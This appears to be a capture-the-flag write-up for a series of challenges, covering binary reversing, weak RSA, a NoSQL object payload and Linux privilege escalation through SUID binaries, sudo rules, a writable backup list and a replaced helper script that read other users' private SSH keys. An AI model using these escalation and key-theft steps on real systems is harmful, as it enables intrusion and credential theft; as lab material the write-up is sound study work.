# Contents
[1. Grunnlegende](#1-grunnleggende) <br>
[2. Oppdrag](#2-oppdrag)

# 1. Grunnleggende
## 1.5 Chiffermelding
todo


## 1.6 Unchained

First run find / -perm -4000 2>/dev/null
We find a number of files that we can run as root.
We cant abuse the suid to read a file with gawk by doing following:

LFILE=file_to_read
./gawk '//' "$LFILE"

## 1.7 Innslipsord

We open the binary Innslipsord in ghidra.
Lets get some key information.

```
local_60 = 0;
do {
    if (0x1f < local_60) {
        ...
        return uVar3;
    }
    ...
    local_60 = local_60 + 1;
} while (true);
<rest of code>
uVar2 = rol(local_58[local_60] ^ *(byte *)(param_1 + local_6 0),cVar1 + 1U & 7);
<rest of code>
```

* The check password function iterates from 0 to 31. (password is 32 bytes).
* calls a function called rol. (rotates each byte with (index +1) & 7)
* The user input is XORed with the byte from the first half of local_58.

We need to undo the rotation to get the clear text of the password.
Script is here: [innslips_ord.py](innslips_ord.py)

## 1.9 NoSQL
https://book.jorianwoltjer.com/web/frameworks/nodejs
Weird things that to happend when you pass in an object.
```
{
  "flag": {
    "flag": 1
  }
}
```

## 1.10 Breakout
### user1
ssh to user with credentials found in readme.
### user2
cat file in user1 home.
### user3
cat hidden file found with `ls -al`
### user4
We have a folder that we cant read. But inside of the folder there is another folder we can read.
With a hint in the readme, they tip about `super_secret_information`.
we cant easily ls inside and read files. 
```bash
$ ls secret_information/super_secret_information
$ transaction.png  user3.txt
```
### user5
```bash
-rw-r-----    1 root     nisser          27 Dec 26 19:15 user4.txt
```
user4 is owned by root and members of the group nisser can read it.
luckily user4 can sudo as a member of nisser.
```bash
$ sudo -l
User user4 may run the following commands on breakout:
    (julenissen) NOPASSWD: /bin/cat
$ sudo -u julenissen /bin/cat user4.txt 
```
### user6
username and password can be read instantly and we can su into user6.
But the shell is broken and we cant use commands like cat and ls. This can be fixed by spawning a new shell.
```bash
bash
ls
cat flag.txt
```

## 1.11 Solveme
Scripts: 
* [solveMe with bruteforce](solveMeBrute.py) 
* [simple](solveme.py)
### 1.11.1
We can simply run strings on the binary and get the password.

### 1.11.2
By analysing the binary we can see that the password is the first 16 bytes of ""What a beautiful password you have chosen for yourself"
Which translates to "a beautiful pass"

```c++  
  std::__cxx11::string::string<>
            (local_a8,"What a beautiful password you have chosen f or yourself!",&local_b1);
  std::allocator<char>::~allocator((allocator<char> *)&local_b 1);
  for (local_b0 = 0; local_b0 < 0x10; local_b0 = local_b0 + 1) {
    pcVar2 = (char *)std::__cxx11::string::operator[]((ulong)param_1);
    cVar1 = *pcVar2;
    pcVar2 = (char *)std::__cxx11::string::operator[]((ulong)local_a8);
    if (cVar1 != *pcVar2) {
      exit(1);
    }
  }
```

### 1.11.3
In the binary we see 4 interesting hex values. And the function that creates the password from these values.
```c++
local_c8[0] = -0x708baa70;
local_c8[1] = 0x6b838889;
local_c8[2] = 0x8c5d8485;
local_c8[3] = 0x6283616a;
<more code>
  local_e8 = 0;
  for (local_e4 = 0; local_e4 < 4; local_e4 = local_e4 + 1) {
    local_dc = local_e8 * 0x1010101 + 0x10203;
    local_e8 = local_e8 + 4;
    if (local_c8[local_e4] != (local_dc ^ *(uint *)(local_d0 + (long) local_e4 * 4)) + 0x23232323) {
      *(undefined8 *)((long)puVar6 + lVar3 + -8) = 0x103216;
      poVar4 = std::operator<<((ostream *)std::cout,"Please try again...");
      *(undefined8 *)((long)puVar6 + lVar3 + -8) = 0x103228;
      std::ostream::operator<<(poVar4,std::endl<>);
      *(undefined8 *)((long)puVar6 + lVar3 + -8) = 0x103232;
      exit(1);
    }
  }
```
This code is easily readable and we can extract following:
```python
local_dc = local_e8 * 0x1010101 + 0x10203 ## Used for XOR
local_e8 = local_e8 + 4 ## updated each loop
local_c8[index] != (local_dc ^ (local_e8 + 0x23232323)) ##this needs to be reversed
reversed_c8 = ((local_c8[index] - 0x23232323) ^ local_dc)
```

### 1.11.4
This part is about to guess the correct password that creates the flag we need. Therefore we need to bruteforce until we get a FLAG{\<md5_sum>} response. the password is 4 characters long. With the english alphabet we have 26 letters which means we have 26^4 different combinations. To make this process go fast I created multiple threads to try different combinations.

### 1.11.5
This flag was not visble in the binary before all password had been typed in. In order to make this flag visble you had to create a breakpoint inside the main function so the program would not exit after delivering all passwords and then inspecting the text binaries.

## 1.12 Ubalansert
We get a weak RSA that can easily be solved by RsaCtfTool
```bash
RsaCtfTool -n <n> -e <e> --decrypt <c>
```

## 1.13_RSA7777

When we try to ssh to the server we get a response with a public key:
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAADzQGt3NF3nyHJPSJoA3201S8SEO856QXU5Tx8otw0ge4IEhYJECYptgJbgZiTaui476XoqdDjWI22MUsURHOtjqgRF7oRxs5IJU501FZh7utyqjQ5gccNKGHKBmMA/J94iTUEuzQ44uK/zRB+elkzLEVv1Df1LsqOxPF2mKYQzGxeLzD5WfPI8UwcczYYjbtlyrpTcA5tzmeLnqcERzd/9EctuwSvL9Cv7JVn/9gLyPZur5oW68oaueWwLDxJj9gxYP6URxb9Jkyk5EPRO2QiXn9JiIfKgtU0g1qm+Eg8w9bD/ts8wjw5IqUmjLeH0X9OSh/FKn7ASaNytygfG3Zp5IWmOaIE9oeUQyaQWmgcesYKv32VlgMpUB/vpfhsI6+jwIE9XwUbF6uDaYX1xHi+kebnJmLWimadHQPgzBqOuBdOGi58cNPkxy5y+n1UNatEuh18OWaLGhITTcT2mRVPgLK6Ahk6UlTUodMGGMXgSioILredNkVvszVFnXApK3iQAVgug0kpfWKt33Pn5I55z0TmxqTfijF1sY7T1MhsT6TI4F8djR03akuLMs+lcHw+MFTuxUTV2gwhTThMSbrs8ftpCEZSzzxg/mPOhxsciM0bJZWP1bOamndhrIbALK4wuXCoantwChd+6GVKZ5DOrg+6XSgrI1BWgCmf+HQ/i6X6Snvg7wQ9r1atkcO5el8tEBvgH+TewuQtBTByJ4zPlxUySO29LjmGPQ+kCLCEyPfZ78ibBL3ZUNbl2Xum3WuDp58FR/oS1dZr/U+bUFfBj/QngYQCJZQf+R/AzXJzbzP/DwrhI5yW1BvtCNaGDds9GhweGZ0YyK9nl067EuJ/GD4GA35U/f4lh2NGOPi4Rz0rMX9RIXj0i7malmYLwwmSMXp8IVe+a8QdM93uu5Et6UO6HgfADSCf4Q0cKA12UGbIR5NH7ujIp63dsdwgUTQ5vBu+GpxqgQeKydsu5N3y+sXOO7O087nIrhMVuK3PVKuFJ+nNfHVsq1y1LFLl1Ral7+K1vgB9ZnzNVVrwJPZgC6+kt4g1llhtr/XgABYadv4Trw4QgAT+EQ+VYEJa3idJoUQy4tbbbDOmmKRzMxAsZVmroMDRYtJC7x8+i45LRIBNMhQ/Pz2gucLiHdpKNF9e1liIu1UkM20NOFtcWvDAX9laLkrsWgpypUBiLS7RtyXgTNjovWZo3U+CMy6VjabPdGf4JqUJDT+YZXYl2S7CfGm6SACzuyeabs2HudYoCBMcgqkefQIcRrVpLMLMpfZuD/XoKzqvVNrC6Egx4u0=
```
We can use RsaCtfTool to crack the private key

By doing following: `RsaCtfTool --publickey "*.pub" --private`

## 1.14 apollo
todo

## 1.15 Missile Command
todo

## 1.16 Legend of Vexillum
todo

# 2. Oppdrag

## 2.2 Digifil
We get access to a website and its source code.
In its source code we find these interesting code parts:
```js
function sha256_buf(data) {
    return crypto
        .createHash('sha256')
        .update(data)
        .digest()
}

function sign(user) {
    var SEED = ''
    for (var i=0; i<20; i++) ЅEED = SEED + (Math.random()+'').substr(2)
    var userHash = sha256_buf(user)
    var sig = xor(userHash, sha256_buf(SEED))
    var signature = sig.toString('hex')
    return signature
}
```
Seed is not being set. as the example shows the S is not the same in the for loop. Therefore we can copy paste these functions and exclude replace the seed as a empty string. [Solve script](part2-2.py). 

## 2.9 Trappetrinn
### 2.9.1 Sarah
cat sarah.txt
### 2.9.2 David
We find out sarah is a part of the group projectteam. We can find the owned files by doing:
```bash
$ find / -group projectteam 2>/dev/null
/opt/projects
/opt/projects/projectAtla
/opt/projects/projectAtla/backup
/opt/projects/projectAtla/backup/files
/opt/projects/projectAtla/backup/filesToBackup
/opt/projects/projectAtla/projectPlan.txt
/opt/projects/projectAtla/NoteFromDavid.md
```
In the projectAtla folder we find the note from david
```
Sarah,

I've set up a temporary backup script for important files related to the project.  
It runs automatically every minute.

The script reads the path to back up from the 'filesToBackup' file in the backup folder.  
If you want to back up any files, just add them to that file. 
Make sure there is a newline between the file paths though, or it won't work. 

It's just a simple hack until I get the proper backup runner finished.

— David

```
the backup.sh takes backup from any folder that david as access to, since the script is ran as David.
Lets try to get his flag.
I append these two lines to the filesToBackup list.

```
/home/david/david.txt
/home/david/.ssh/id_rsa
```

And now we have pwned david!
We can now take his key and use it to ssh as david.
```bash
echo "<key>" > key.rsa
chmod 600 key.rsa
ssh david@trappetrinn -i key.rsa
cat david.txt
```
### 2.9.3 Priya
When we viewed the groups in 2.9.2 we also saw that David is part of projectteam group with priya.
```bash
$ find / -group seniorteam 2>/dev/null
/opt/senior-tools
/opt/senior-tools/programs
/opt/senior-tools/programs/runTask.c
/opt/senior-tools/programs/runTask
/opt/senior-tools/helper-scripts/NoteFromPriya.md
/opt/senior-tools/helper-scripts/helper.sh
/opt/senior-tools/scripts
```

We can simply change the helper.sh script that the runTask binary runs as Priya.
Problem is that SUID sh files does not transmit SUID, while other languages may..
We change it to a python script that fetches the ssh key.
```python
#!/usr/bin/python3
import subprocess

subprocess.run(['cat', '/home/priya/.ssh/id_rsa'])
```

### 2.9.4 root
Really simple exploit
```bash
priya@trappetrinn:~$ sudo -l
Matching Defaults entries for priya on trappetrinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User priya may run the following commands on trappetrinn:
    (ALL) NOPASSWD: /usr/bin/nano
```

And do [following](https://gtfobins.github.io/gtfobins/nano/) to get root.

## 2.19 kaffemaskin
### 2.19.1 user
We find default creds in the browser
admin:coffee

useful info found in admin page.
* admin_pin: 8888aaaa

we go to /admin and we remove some html that prevents us from writing the pin.
We now get access to 
* service tab that allows us to run a service script.
* Download source code
* Admin files